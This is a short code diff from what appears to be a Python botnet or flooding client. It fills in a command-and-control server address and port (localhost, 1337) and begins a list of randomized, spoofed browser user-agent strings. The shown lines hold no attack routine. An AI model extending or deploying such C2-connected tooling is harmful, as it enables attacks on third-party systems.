@@ -3,8 +3,8 @@ import threading
 import time
 import random
 
-C2_ADDRESS  = 'server ip here'
-C2_PORT     = 'cnc port here'
+C2_ADDRESS  = '127.0.0.1'
+C2_PORT     = '1337'
 
 base_user_agents = [
     'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Firefox/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
